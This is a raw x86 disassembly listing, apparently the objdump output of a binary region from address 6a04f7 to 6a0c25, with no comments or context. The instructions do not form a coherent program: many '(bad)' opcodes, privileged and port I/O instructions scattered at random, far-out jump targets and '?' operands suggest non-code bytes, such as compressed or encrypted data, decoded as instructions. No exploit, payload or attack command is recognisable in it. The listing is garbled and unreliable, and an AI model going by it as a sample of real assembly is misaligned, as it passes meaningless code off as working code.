  6a04f7:	push   ds
  6a04f8:	or     eax,0x872c0ea1
  6a04fd:	or     al,BYTE PTR [edi+eiz*2+0x48ff58d8]
  6a0504:	pop    ecx
  6a0505:	aas    
  6a0506:	test   eax,0x3e4a2052
  6a050b:	mov    bl,0x6a
  6a050d:	fmul   DWORD PTR ds:0x2cbd855a
  6a0513:	cmp    esi,esp
  6a0515:	adc    al,0x9e
  6a0517:	sbb    dl,BYTE PTR ds:0x167bc7c6
  6a051d:	adc    ch,al
  6a051f:	test   BYTE PTR [eax],al
  6a0521:	mov    ds:0x8755ace5,eax
  6a0526:	xchg   DWORD PTR [eax+0x450473a],ebx
  6a052c:	repnz push ecx
  6a052e:	call   0xd11cb7b6
  6a0533:	lahf   
  6a0534:	push   cs
  6a0535:	sub    DWORD PTR [eax+0x76],edi
  6a0538:	xchg   ecx,eax
  6a0539:	(bad)  [esi+0xc]
  6a053c:	pop    esi
  6a053d:	outs   dx,BYTE PTR ds:[esi]
  6a053e:	xchg   BYTE PTR [esi+0x68],dh
  6a0541:	push   ds
  6a0542:	icebp  
  6a0543:	jbe    0x6a051a
  6a0545:	faddp  st(6),st
  6a0547:	cmp    BYTE PTR [eax+0x76],al
  6a054a:	mov    ch,0xdf
  6a054c:	icebp  
  6a054d:	cmp    esi,DWORD PTR [esi-0x16]
  6a0550:	adc    BYTE PTR [eax],0xe4
  6a0553:	dec    esp
  6a0554:	stos   DWORD PTR es:[edi],eax
  6a0555:	in     al,0x1d
  6a0557:	push   0xc76bc383
  6a055c:	mov    edx,0x76056658
  6a0561:	repnz shl BYTE PTR [ecx+0x6530fa4],1
  6a0568:	jp     0x6a055d
  6a056a:	imul   esp,DWORD PTR [ebp+ecx*4+0x47],0x64
  6a056f:	loope  0x6a0533
  6a0571:	addr16 inc ebx
  6a0573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a0574:	imul   ebp,DWORD PTR [ecx-0x73],0xffffffe8
  6a0578:	adc    esp,esi
  6a057a:	xchg   BYTE PTR [edx],al
  6a057c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a057d:	lea    eax,[ecx+0x78f6ca53]
  6a0583:	fst    DWORD PTR [ecx-0x40]
  6a0586:	and    al,0x7c
  6a0588:	jo     0x6a0567
  6a058a:	fisub  WORD PTR [ecx+0x4c]
  6a058d:	dec    esi
  6a058e:	cmp    al,0xbb
  6a0590:	sti    
  6a0591:	mov    eax,ds:0x99378383
  6a0596:	xlat   BYTE PTR ds:[ebx]
  6a0597:	pop    ss
  6a0598:	pop    edi
  6a0599:	ror    ebx,0xe1
  6a059c:	test   al,0x20
  6a059e:	mov    ds:0x769eac7b,al
  6a05a3:	jns    0x6a053a
  6a05a5:	mov    dh,cl
  6a05a7:	mov    dh,0x8c
  6a05a9:	hlt    
  6a05aa:	pop    edi
  6a05ab:	pop    ebp
  6a05ac:	(bad)  
  6a05ad:	sub    DWORD PTR [ecx+0x15088e62],ebx
  6a05b3:	retf   
  6a05b4:	mov    ebx,0x90874029
  6a05b9:	in     eax,dx
  6a05ba:	push   edx
  6a05bb:	mov    WORD PTR [edi*2+0x3eeb415e],es
  6a05c2:	adc    al,0xbf
  6a05c4:	sub    BYTE PTR [edi+edx*4-0x2],0xa7
  6a05c9:	xor    al,0x6c
  6a05cb:	mov    ?,WORD PTR [ecx+eax*1-0x1160ee83]
  6a05d2:	push   eax
  6a05d3:	and    al,0xb0
  6a05d5:	add    cl,ch
  6a05d7:	jnp    0x6a0606
  6a05d9:	xor    al,0x34
  6a05db:	lahf   
  6a05dc:	xor    edx,DWORD PTR ds:0xd5284a33
  6a05e2:	jno    0x6a0656
  6a05e4:	mov    DWORD PTR [esi+0x3110e763],edi
  6a05ea:	leave  
  6a05eb:	test   ah,ch
  6a05ed:	pop    esp
  6a05ee:	mov    dl,dh
  6a05f0:	dec    eax
  6a05f1:	in     eax,0x81
  6a05f3:	cwde   
  6a05f4:	lods   eax,DWORD PTR ds:[esi]
  6a05f5:	adc    dh,BYTE PTR [esi-0x5d]
  6a05f8:	sbb    cl,dh
  6a05fa:	int3   
  6a05fb:	shl    DWORD PTR [esi-0x6a6f9944],0x2a
  6a0602:	sahf   
  6a0603:	imul   edx,edx,0x14859a4
  6a0609:	pushf  
  6a060a:	call   0x873:0x8124c436
  6a0611:	jl     0x6a05fc
  6a0613:	push   ebp
  6a0614:	iret   
  6a0615:	retf   0x3d81
  6a0618:	push   ebp
  6a0619:	hlt    
  6a061a:	fs and eax,0xb58db8b1
  6a0620:	push   edi
  6a0621:	nop
  6a0622:	mov    dl,0x8c
  6a0624:	sbb    BYTE PTR [eax+edi*8+0x134e8bea],cl
  6a062b:	mov    ebx,0x7c8560f3
  6a0630:	xchg   esi,eax
  6a0631:	retf   0x4ad4
  6a0634:	xchg   si,di
  6a0637:	sti    
  6a0638:	lods   eax,DWORD PTR ds:[esi]
  6a0639:	mov    WORD PTR [esi-0x77],fs
  6a063c:	out    dx,al
  6a063d:	sbb    DWORD PTR [esi],eax
  6a063f:	fiadd  WORD PTR [ecx]
  6a0641:	arpl   WORD PTR [eax+eax*4+0x6159928a],di
  6a0648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a0649:	test   eax,0x18dc50b1
  6a064e:	in     al,0xc6
  6a0650:	cli    
  6a0651:	retf   0x3ab1
  6a0654:	push   esi
  6a0655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a0656:	sti    
  6a0657:	jle    0x6a06d1
  6a0659:	rol    dl,1
  6a065b:	xchg   ecx,eax
  6a065c:	mov    bl,0x12
  6a065e:	push   eax
  6a065f:	xchg   edx,eax
  6a0660:	sub    dh,ch
  6a0662:	mov    al,ds:0x60d8b6e5
  6a0667:	icebp  
  6a0668:	mov    es,ebx
  6a066a:	or     bh,BYTE PTR [edx+0x6e82b3c6]
  6a0670:	adc    ah,al
  6a0672:	fwait
  6a0673:	sbb    eax,0x9d4a5fd2
  6a0678:	fisub  DWORD PTR [ebx-0x5cc31bf2]
  6a067e:	(bad)  
  6a067f:	test   al,0x6e
  6a0681:	fidivr DWORD PTR ds:0x42ec4ac4
  6a0687:	jecxz  0x6a06b6
  6a0689:	hlt    
  6a068a:	jge    0x6a0678
  6a068c:	es mov bh,0x57
  6a068f:	test   BYTE PTR [ebp+edx*8+0x1f],ch
  6a0693:	xchg   esi,eax
  6a0694:	jg     0x6a06a0
  6a0696:	sbb    al,0xf9
  6a0698:	in     al,dx
  6a0699:	into   
  6a069a:	push   ecx
  6a069b:	clc    
  6a069c:	mov    ds:0x53163c65,al
  6a06a1:	inc    esi
  6a06a2:	mov    bl,0x4c
  6a06a4:	(bad)  
  6a06a5:	cdq    
  6a06a6:	adc    edx,esi
  6a06a8:	stos   BYTE PTR es:[edi],al
  6a06a9:	adc    DWORD PTR [edi-0x3e],ebx
  6a06ac:	in     al,dx
  6a06ad:	dec    esp
  6a06ae:	pop    ss
  6a06af:	cmp    ebx,ebx
  6a06b1:	gs jle 0x6a0644
  6a06b4:	pop    esi
  6a06b5:	stos   BYTE PTR es:[edi],al
  6a06b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a06b7:	dec    eax
  6a06b8:	test   al,0x50
  6a06ba:	repnz sub DWORD PTR [ecx-0x7c],edx
  6a06be:	pop    ebp
  6a06bf:	retf   
  6a06c0:	in     eax,dx
  6a06c1:	and    eax,0xeccbd80
  6a06c6:	xchg   BYTE PTR [edi],dl
  6a06c8:	pushf  
  6a06c9:	std    
  6a06ca:	lods   eax,DWORD PTR ds:[esi]
  6a06cb:	pop    edx
  6a06cc:	add    esi,DWORD PTR [edx+0x2b]
  6a06cf:	jg     0x6a06b6
  6a06d1:	mov    ds:0xdc04586b,al
  6a06d6:	and    al,0x5b
  6a06d8:	inc    esi
  6a06d9:	aad    0x3b
  6a06db:	imul   ebx,edi,0xbd16cd18
  6a06e1:	loope  0x6a06c5
  6a06e3:	repnz cs cmc 
  6a06e6:	dec    ebp
  6a06e7:	fsub   DWORD PTR [ebx+0x72]
  6a06ea:	fidivr WORD PTR [ebp+0x65aa43df]
  6a06f0:	jbe    0x6a0731
  6a06f2:	push   edx
  6a06f3:	fbld   TBYTE PTR [edx]
  6a06f5:	xchg   DWORD PTR [esp+ebp*1-0x78],edx
  6a06f9:	mov    BYTE PTR [esi-0x61f3356e],dh
  6a06ff:	outs   dx,DWORD PTR ds:[esi]
  6a0700:	and    BYTE PTR [edx+0x4fbe3082],ch
  6a0706:	jecxz  0x6a074d
  6a0708:	addr16 adc al,0xc9
  6a070b:	jge    0x6a076a
  6a070d:	mov    ecx,DWORD PTR [bp+di]
  6a0710:	(bad)  
  6a0711:	iret   
  6a0712:	jb     0x6a070f
  6a0714:	mov    bl,BYTE PTR [ebp+0x8ea1dad]
  6a071a:	ret    0x9cee
  6a071d:	sbb    BYTE PTR [edx+0x29],bl
  6a0720:	xor    ah,BYTE PTR [esi]
  6a0722:	lods   al,BYTE PTR ds:[esi]
  6a0723:	pop    es
  6a0724:	scas   eax,DWORD PTR es:[edi]
  6a0725:	fndisi(8087 only) 
  6a0727:	out    0xe2,al
  6a0729:	ja     0x6a06e1
  6a072b:	add    dl,BYTE PTR [ebp-0x355f613c]
  6a0731:	sbb    al,0x27
  6a0733:	not    DWORD PTR [ecx+0x30]
  6a0736:	sub    DWORD PTR [edi],ebp
  6a0738:	xlat   BYTE PTR ds:[ebx]
  6a0739:	pop    eax
  6a073a:	xor    BYTE PTR [ecx+0x20fc95d3],ch
  6a0740:	idiv   edi
  6a0742:	jmp    0xa1e63a8a
  6a0747:	inc    ebx
  6a0748:	push   eax
  6a0749:	scas   eax,DWORD PTR es:[edi]
  6a074a:	jne    0x6a0785
  6a074c:	sub    eax,0x71e87fba
  6a0751:	mov    esp,0xad1cc7bb
  6a0756:	into   
  6a0757:	ret    0x1bee
  6a075a:	mov    ch,0xb9
  6a075c:	ret    
  6a075d:	jp     0x6a0751
  6a075f:	loopne 0x6a07d7
  6a0761:	(bad)  
  6a0762:	cs pop edx
  6a0764:	das    
  6a0765:	int3   
  6a0766:	sub    eax,0xb82426e1
  6a076b:	sahf   
  6a076c:	inc    ebx
  6a076d:	or     BYTE PTR [ecx-0x67ebe007],dl
  6a0773:	inc    ebx
  6a0774:	cmp    al,0x59
  6a0776:	ror    eax,1
  6a0778:	xchg   BYTE PTR [ebx-0x76],dh
  6a077b:	mov    dh,0x4f
  6a077d:	add    al,dh
  6a077f:	iret   
  6a0780:	pushw  0xffe2
  6a0783:	mov    eax,0x3beb6882
  6a0788:	adc    DWORD PTR [eax+0x278f027a],edx
  6a078e:	sbb    ebx,DWORD PTR [ebx+0x19470a38]
  6a0794:	test   al,0xbf
  6a0796:	repnz push es
  6a0798:	pop    ebp
  6a0799:	pop    ebp
  6a079a:	test   BYTE PTR [eax-0x373ae1d3],0x3b
  6a07a1:	rol    DWORD PTR [eax+ebx*2+0x56],0xec
  6a07a6:	adc    esi,edx
  6a07a8:	mov    esi,0x7fa44649
  6a07ad:	(bad)  
  6a07ae:	jle    0x6a0829
  6a07b0:	or     BYTE PTR [eax+0x5f],bh
  6a07b3:	xlat   BYTE PTR ds:[ebx]
  6a07b4:	aam    0xce
  6a07b6:	jns    0x6a0788
  6a07b8:	js     0x6a07f0
  6a07ba:	daa    
  6a07bb:	inc    ebx
  6a07bc:	pop    ds
  6a07bd:	xchg   ebp,eax
  6a07be:	mov    ds:0x70f9d6c9,eax
  6a07c3:	js     0x6a0755
  6a07c5:	dec    eax
  6a07c6:	sar    BYTE PTR [ebx-0x5d],cl
  6a07c9:	fmulp  st(5),st
  6a07cb:	cmp    DWORD PTR ds:0x91367fd3,esp
  6a07d1:	stc    
  6a07d2:	inc    ebp
  6a07d3:	cmp    DWORD PTR [esi],edi
  6a07d5:	div    BYTE PTR [eax-0x53948976]
  6a07db:	mov    ah,0x99
  6a07dd:	mov    ds:0x89c64782,al
  6a07e2:	sub    BYTE PTR [eax-0x3b5d3b9d],bl
  6a07e8:	fist   WORD PTR [edi-0x61]
  6a07eb:	pop    edx
  6a07ec:	mov    al,ds:0xee9cbbb7
  6a07f1:	pop    ecx
  6a07f2:	cmp    al,0x8c
  6a07f4:	imul   DWORD PTR [ecx]
  6a07f6:	(bad)  
  6a07f7:	mov    eax,ds:0x8ffa46df
  6a07fc:	popa   
  6a07fd:	mov    ebx,cs
  6a07ff:	ror    DWORD PTR [edx+edi*4-0x2f48ba1],0x23
  6a0807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a0808:	and    dl,dh
  6a080a:	jmp    0x6a085a
  6a080c:	pop    edx
  6a080d:	inc    ebx
  6a080e:	iret   
  6a080f:	jl     0x6a0811
  6a0811:	test   BYTE PTR ds:0xcfebb450,dh
  6a0817:	not    DWORD PTR [esi-0x30]
  6a081a:	mov    esp,0xfa4fc46
  6a081f:	push   esp
  6a0820:	xor    eax,0x65c5172f
  6a0825:	xchg   DWORD PTR [edx+0x70c49072],ebx
  6a082b:	push   ds
  6a082c:	and    bl,BYTE PTR [edx+0x55]
  6a082f:	cmc    
  6a0830:	push   ds
  6a0831:	pushf  
  6a0832:	repz mov ecx,0x1ecab7bf
  6a0838:	pop    esi
  6a0839:	or     eax,0xf7da459
  6a083e:	inc    ebp
  6a083f:	mov    BYTE PTR [ecx-0xb],dh
  6a0842:	adc    BYTE PTR [edi],cl
  6a0844:	xchg   edi,eax
  6a0845:	xchg   ecx,eax
  6a0846:	out    dx,eax
  6a0847:	mov    eax,ds:0x279ae32c
  6a084c:	loopne 0x6a0877
  6a084e:	enter  0x63ad,0x2e
  6a0852:	sbb    DWORD PTR [edi+0x4fbcbd66],esi
  6a0858:	inc    edi
  6a0859:	or     al,0xd3
  6a085b:	sbb    ecx,edi
  6a085d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a085e:	xchg   ebx,eax
  6a085f:	into   
  6a0860:	test   DWORD PTR [edi+0xf81183c],esi
  6a0866:	aas    
  6a0867:	(bad)  
  6a0868:	repnz and bh,bh
  6a086b:	aaa    
  6a086c:	mov    cs,WORD PTR [esi-0x32c1cc02]
  6a0872:	leave  
  6a0873:	pop    ebx
  6a0874:	test   dl,al
  6a0876:	inc    edx
  6a0877:	inc    ecx
  6a0878:	ds lahf 
  6a087a:	sysexit 
  6a087c:	push   ebp
  6a087d:	inc    ebp
  6a087e:	leave  
  6a087f:	xchg   ebp,eax
  6a0880:	adc    eax,ebx
  6a0882:	jnp    0x6a08c5
  6a0884:	add    cl,BYTE PTR [edi-0x1aa511d1]
  6a088a:	add    edx,DWORD PTR [eax-0x6fa37876]
  6a0890:	sbb    bl,ah
  6a0892:	pop    es
  6a0893:	js     0x6a090f
  6a0895:	xor    DWORD PTR [eax+0x67],esi
  6a0898:	mov    bl,0xd7
  6a089a:	shl    DWORD PTR [esp+edx*2-0x6b1bfe61],cl
  6a08a1:	jbe    0x6a0883
  6a08a3:	lea    esp,[edx+ebx*1]
  6a08a6:	dec    edi
  6a08a7:	sbb    BYTE PTR [edx-0x77278f79],0xca
  6a08ae:	arpl   WORD PTR [edx],si
  6a08b0:	mul    ebx
  6a08b2:	retf   0xb5c1
  6a08b5:	inc    edx
  6a08b6:	mov    ?,ecx
  6a08b8:	pop    ss
  6a08b9:	xchg   DWORD PTR [ecx],ecx
  6a08bb:	aad    0x1e
  6a08bd:	adc    DWORD PTR [edi+0x28],eax
  6a08c0:	icebp  
  6a08c1:	and    BYTE PTR ds:0xf700702c,0x48
  6a08c8:	test   al,0xa0
  6a08ca:	xor    al,0x8c
  6a08cc:	inc    esp
  6a08cd:	out    0x9e,al
  6a08cf:	jmp    DWORD PTR [edi+0x5f]
  6a08d2:	jl     0x6a089f
  6a08d4:	pop    esp
  6a08d5:	out    0xb8,eax
  6a08d7:	lahf   
  6a08d8:	push   esi
  6a08d9:	popf   
  6a08da:	aas    
  6a08db:	test   eax,0x8f7b1bad
  6a08e0:	xor    ecx,DWORD PTR [edx]
  6a08e2:	jle    0x6a0932
  6a08e4:	adc    ebp,DWORD PTR [edi-0x71]
  6a08e7:	fnsave [eax]
  6a08e9:	or     esi,DWORD PTR [esi-0x5b5b190d]
  6a08ef:	pop    ss
  6a08f0:	jmp    0x6a088d
  6a08f2:	push   0xf5c4ed14
  6a08f7:	dec    edi
  6a08f8:	ror    BYTE PTR [edi-0x5b15b330],0xb0
  6a08ff:	push   edx
  6a0900:	adc    al,0xa6
  6a0902:	test   ah,dl
  6a0904:	mov    edx,0xb7878e77
  6a0909:	fsub   QWORD PTR [edi+0x13]
  6a090c:	sbb    DWORD PTR [edx],edx
  6a090e:	jnp    0x6a08e1
  6a0910:	cli    
  6a0911:	aaa    
  6a0912:	in     eax,0xb6
  6a0914:	aad    0xca
  6a0916:	dec    ebp
  6a0917:	ja     0x6a097e
  6a0919:	cmp    BYTE PTR [ebx],ah
  6a091b:	sbb    al,0xef
  6a091d:	inc    edx
  6a091e:	out    dx,al
  6a091f:	jmp    0xea43:0xa0fe3984
  6a0926:	lea    ebx,[edi]
  6a0928:	inc    esp
  6a0929:	aad    0xe6
  6a092b:	mov    bl,0xea
  6a092d:	lahf   
  6a092e:	icebp  
  6a092f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a0930:	(bad)  
  6a0931:	test   al,0x2e
  6a0933:	jecxz  0x6a0993
  6a0935:	icebp  
  6a0936:	jo     0x6a0910
  6a0938:	dec    ebp
  6a0939:	fdivr  QWORD PTR [ebp-0x3c3fddaf]
  6a093f:	dec    edi
  6a0940:	cmp    ah,ch
  6a0942:	push   0xbeb88b58
  6a0947:	xchg   edi,eax
  6a0948:	mov    ebp,ebx
  6a094a:	mov    edx,0x68338f99
  6a094f:	add    DWORD PTR [ecx+0x62f4c1],0xffffff9c
  6a0956:	jl     0x6a08e1
  6a0958:	xchg   DWORD PTR [ecx-0x4fefb3ea],esi
  6a095e:	fld    TBYTE PTR [edi-0x3f2b151]
  6a0964:	loopne 0x6a093f
  6a0966:	int3   
  6a0967:	mov    bh,0x8d
  6a0969:	in     al,0xc5
  6a096b:	pop    esp
  6a096c:	dec    edi
  6a096d:	jae    0x6a0972
  6a096f:	pop    edx
  6a0970:	iret   
  6a0971:	lock das 
  6a0973:	inc    ebx
  6a0974:	pop    edi
  6a0975:	test   BYTE PTR [si-0x13],cl
  6a0979:	sbb    eax,DWORD PTR [edx]
  6a097b:	in     eax,0x72
  6a097d:	cmp    al,0x4a
  6a097f:	mov    ds:0x61236b12,al
  6a0984:	cmp    dl,BYTE PTR [edx]
  6a0986:	dec    esp
  6a0987:	pop    es
  6a0988:	xor    esi,esp
  6a098a:	and    al,0xf1
  6a098c:	cs int 0x23
  6a098f:	outs   dx,DWORD PTR ds:[esi]
  6a0990:	mov    cl,0xab
  6a0992:	sub    DWORD PTR [edx],esi
  6a0994:	mov    ah,0xa
  6a0996:	mov    al,0x17
  6a0998:	pop    ebx
  6a0999:	cli    
  6a099a:	push   es
  6a099b:	je     0x6a0989
  6a099d:	out    0xa1,al
  6a099f:	dec    esp
  6a09a0:	mul    BYTE PTR [ebx+ebx*1+0x1e742a76]
  6a09a7:	scas   al,BYTE PTR es:[edi]
  6a09a8:	mov    eax,ds:0xdda6c36a
  6a09ad:	and    BYTE PTR [edi],bh
  6a09af:	in     eax,dx
  6a09b0:	daa    
  6a09b1:	shl    DWORD PTR ds:[ebx-0x6254a4b2],1
  6a09b8:	push   eax
  6a09b9:	ret    
  6a09ba:	mov    dh,cl
  6a09bc:	inc    ebp
  6a09bd:	(bad)  
  6a09be:	int    0xa2
  6a09c0:	(bad)  
  6a09c1:	jns    0x6a0985
  6a09c3:	cmp    BYTE PTR [ebx+0x66352f69],ch
  6a09c9:	stc    
  6a09ca:	mov    fs,WORD PTR [eax-0x3f91d43]
  6a09d0:	sub    al,0xe7
  6a09d2:	mov    ebp,0xe6654be3
  6a09d7:	mov    ah,0x78
  6a09d9:	mov    ebx,0xe4dffb8f
  6a09de:	sub    ah,BYTE PTR [ecx+0x42fca2a5]
  6a09e4:	sbb    esp,DWORD PTR [esi-0x56]
  6a09e7:	sbb    dh,BYTE PTR [eax]
  6a09e9:	das    
  6a09ea:	lock push edi
  6a09ec:	or     DWORD PTR [ebx+0x48],ebp
  6a09ef:	mov    ch,0x6d
  6a09f1:	mov    cl,0x70
  6a09f3:	mov    ch,0x2b
  6a09f5:	dec    ebp
  6a09f6:	fisttp QWORD PTR [ecx+0x1c]
  6a09f9:	mov    WORD PTR [esi+0x195e7ad1],?
  6a09ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a0a00:	mov    esi,0xffa8d836
  6a0a05:	push   ebx
  6a0a06:	jnp    0x6a09c8
  6a0a08:	dec    edi
  6a0a09:	sub    DWORD PTR [eax+0x57895324],ebp
  6a0a0f:	(bad)  
  6a0a10:	repnz (bad) 
  6a0a13:	pop    es
  6a0a14:	int3   
  6a0a15:	inc    esi
  6a0a16:	test   al,0x84
  6a0a18:	int3   
  6a0a19:	jmp    0xb6ee15ef
  6a0a1e:	shl    BYTE PTR [eax-0x79],cl
  6a0a21:	sub    BYTE PTR [ebp+0x2c],dl
  6a0a24:	cmp    eax,0x445624f2
  6a0a29:	mov    ebx,DWORD PTR [ebp-0x77e710cf]
  6a0a2f:	call   0xc72db10b
  6a0a34:	add    eax,DWORD PTR [ebp-0x47]
  6a0a37:	lea    eax,[ebp+0x4e]
  6a0a3a:	out    0x45,eax
  6a0a3c:	enter  0xba78,0x90
  6a0a40:	sub    eax,0x1979e1ba
  6a0a45:	outs   dx,DWORD PTR ds:[esi]
  6a0a46:	inc    ecx
  6a0a47:	and    eax,0xd4a65c5b
  6a0a4c:	sub    esi,esp
  6a0a4e:	rcr    ah,1
  6a0a50:	pop    esp
  6a0a51:	fbld   TBYTE PTR [ecx+0x578bef38]
  6a0a57:	push   ds
  6a0a58:	cmc    
  6a0a59:	test   ecx,esp
  6a0a5b:	cmp    BYTE PTR [ebx+0x383e8dd6],cl
  6a0a61:	clc    
  6a0a62:	sbb    BYTE PTR [edx+0x7a],bl
  6a0a65:	mov    ecx,0xba92bb72
  6a0a6a:	jp     0x6a09ee
  6a0a6c:	les    edx,FWORD PTR [edi+edi*1+0x6f791504]
  6a0a73:	lods   eax,DWORD PTR ds:[esi]
  6a0a74:	sahf   
  6a0a75:	mov    ah,0xb1
  6a0a77:	ds inc eax
  6a0a79:	ss jno 0x6a0a32
  6a0a7c:	adc    BYTE PTR [edi+0x4f],dh
  6a0a7f:	jle    0x6a0a90
  6a0a81:	loop   0x6a0a24
  6a0a83:	push   esp
  6a0a84:	add    al,0xea
  6a0a86:	out    0xaf,al
  6a0a88:	aam    0x92
  6a0a8a:	pop    ss
  6a0a8b:	aam    0x9e
  6a0a8d:	iret   
  6a0a8e:	push   es
  6a0a8f:	scas   eax,DWORD PTR es:[edi]
  6a0a90:	add    BYTE PTR [edx+0x724e91d],cl
  6a0a96:	jge    0x6a0a28
  6a0a98:	mov    ds:0x4bfb9073,al
  6a0a9d:	cwde   
  6a0a9e:	or     DWORD PTR [esi],esi
  6a0aa0:	outs   dx,BYTE PTR ds:[esi]
  6a0aa1:	xor    DWORD PTR [edx+edx*2],esi
  6a0aa4:	pop    ss
  6a0aa5:	and    ch,BYTE PTR [ebp+edx*4+0x30]
  6a0aa9:	into   
  6a0aaa:	push   ss
  6a0aab:	lea    esi,ds:0xf1be7ca
  6a0ab1:	mov    bh,0xf8
  6a0ab3:	hlt    
  6a0ab4:	xchg   esp,eax
  6a0ab5:	out    dx,al
  6a0ab6:	nop
  6a0ab7:	push   eax
  6a0ab8:	or     BYTE PTR [edx+edi*4-0x6cbe7be0],ah
  6a0abf:	imul   DWORD PTR [ebp+0x1f]
  6a0ac2:	icebp  
  6a0ac3:	(bad)  
  6a0ac4:	pop    ebp
  6a0ac5:	icebp  
  6a0ac6:	sbb    BYTE PTR [eax+0x46a8fe45],ch
  6a0acc:	dec    DWORD PTR [edi+ebx*2-0x65]
  6a0ad0:	xchg   BYTE PTR ds:0xd86b390c,al
  6a0ad6:	mov    al,ds:0x21990076
  6a0adb:	add    ecx,DWORD PTR [eax-0x66]
  6a0ade:	mov    edx,0xebf796af
  6a0ae3:	pop    ds
  6a0ae4:	addr16 adc eax,0x3918067b
  6a0aea:	inc    ecx
  6a0aeb:	xor    edi,DWORD PTR [ebp-0x63348a07]
  6a0af1:	jl     0x6a0b45
  6a0af3:	ja     0x6a0af5
  6a0af5:	(bad)  
  6a0af6:	cwde   
  6a0af7:	or     eax,0x825e1c0
  6a0afc:	pop    esp
  6a0afd:	add    eax,0x7c47e6b2
  6a0b02:	popa   
  6a0b03:	inc    edi
  6a0b04:	mov    ebp,eax
  6a0b06:	ret    
  6a0b07:	xchg   edi,eax
  6a0b08:	shl    DWORD PTR [edi+0xcd10338],cl
  6a0b0e:	and    bh,BYTE PTR [edx]
  6a0b10:	rcr    DWORD PTR [ebp-0xd105d7c],1
  6a0b16:	call   0xe42007ac
  6a0b1b:	adc    dh,ch
  6a0b1d:	inc    eax
  6a0b1e:	xchg   edx,eax
  6a0b1f:	fisubr WORD PTR [ebp+0x1ac48842]
  6a0b25:	es cwde 
  6a0b27:	fadd   DWORD PTR [eax]
  6a0b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a0b2a:	mov    ecx,0x4322fac2
  6a0b2f:	or     DWORD PTR [eax+edx*1-0x37],0xffffffa3
  6a0b34:	xor    eax,0x1e842b8f
  6a0b39:	leave  
  6a0b3a:	mov    al,ds:0x2ce0f806
  6a0b3f:	pop    es
  6a0b40:	mov    ch,0x90
  6a0b42:	dec    esp
  6a0b43:	shl    cl,1
  6a0b45:	jmp    0x6a0bba
  6a0b47:	cmp    al,0x2e
  6a0b49:	inc    esp
  6a0b4a:	andnps xmm1,XMMWORD PTR [edi+0x44]
  6a0b4e:	ret    0x6cb2
  6a0b51:	(bad)  
  6a0b53:	sar    DWORD PTR [esi],1
  6a0b55:	icebp  
  6a0b56:	jne    0x6a0b01
  6a0b58:	jmp    0x6a0b4f
  6a0b5a:	in     al,0xae
  6a0b5c:	repz jg 0x779f25ba
  6a0b63:	mov    bh,0x21
  6a0b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a0b66:	fdivr  QWORD PTR [ecx]
  6a0b68:	cmp    eax,DWORD PTR [ebp-0x3e]
  6a0b6b:	push   edx
  6a0b6c:	ret    0xcb98
  6a0b6f:	inc    ebp
  6a0b70:	bound  esp,QWORD PTR [ebx-0x55521e03]
  6a0b76:	inc    ecx
  6a0b77:	fstp   QWORD PTR [esi-0x17ede384]
  6a0b7d:	mov    eax,ds:0x7f4ea9a5
  6a0b82:	push   cs
  6a0b83:	mov    edx,DWORD PTR [edi-0x6b]
  6a0b86:	push   0xc24c9579
  6a0b8b:	movhps QWORD PTR [esp+ecx*2],xmm4
  6a0b8f:	mov    eax,ds:0xfe3bbd92
  6a0b94:	mov    ah,0x66
  6a0b96:	xchg   ecx,eax
  6a0b97:	mov    edi,0xf3910182
  6a0b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a0b9d:	cwde   
  6a0b9e:	inc    eax
  6a0b9f:	cmp    DWORD PTR [edi+ecx*1+0x541ccaa6],ecx
  6a0ba6:	cmp    DWORD PTR [ebx],0x8595fc75
  6a0bac:	out    dx,eax
  6a0bad:	ins    DWORD PTR es:[edi],dx
  6a0bae:	jns    0x6a0bc0
  6a0bb0:	clc    
  6a0bb1:	sub    dh,BYTE PTR [edx+0xcbe59c2]
  6a0bb7:	jnp    0x6a0b97
  6a0bb9:	fwait
  6a0bba:	dec    esp
  6a0bbb:	xchg   ecx,esp
  6a0bbd:	test   al,0x73
  6a0bbf:	dec    esp
  6a0bc0:	jg     0x6a0bcb
  6a0bc2:	push   eax
  6a0bc3:	shl    eax,cl
  6a0bc5:	add    dh,BYTE PTR [ebx-0x5]
  6a0bc8:	mov    eax,ds:0xb3dd41be
  6a0bcd:	jle    0x6a0bad
  6a0bcf:	adc    DWORD PTR [ebp-0x45],0x83fe532f
  6a0bd6:	jmp    0x6a0bf7
  6a0bd8:	cmp    BYTE PTR [edi+0x37a65309],dl
  6a0bde:	lock je 0x6a0c31
  6a0be1:	pop    ecx
  6a0be2:	outs   dx,DWORD PTR ds:[esi]
  6a0be3:	pop    ebp
  6a0be4:	dec    esp
  6a0be5:	stc    
  6a0be6:	ins    BYTE PTR es:[edi],dx
  6a0be7:	pop    ebx
  6a0be8:	lock xchg esi,eax
  6a0beb:	or     ah,BYTE PTR [edx+0x3d3e8047]
  6a0bf1:	xchg   esi,eax
  6a0bf2:	cdq    
  6a0bf3:	mov    ebx,0x4c3e9940
  6a0bf8:	mov    ebp,0x673b421d
  6a0bfd:	dec    ebx
  6a0bfe:	rcl    DWORD PTR [edi],cl
  6a0c00:	imul   esp,DWORD PTR [ebx-0x1b],0x59
  6a0c04:	gs sub cl,BYTE PTR cs:[ecx+0x52]
  6a0c09:	repz and bl,0x28
  6a0c0d:	pop    DWORD PTR [ebx-0x49]
  6a0c10:	add    BYTE PTR [edx-0x53],0x9b
  6a0c14:	inc    ebx
  6a0c15:	scas   al,BYTE PTR es:[edi]
  6a0c16:	sub    edx,DWORD PTR [ecx+0xe]
  6a0c19:	add    al,0x36
  6a0c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a0c1c:	ins    DWORD PTR es:[edi],dx
  6a0c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a0c1e:	sub    eax,0x931e4b4c
  6a0c23:	aad    0x6e
  6a0c25:	push   esp
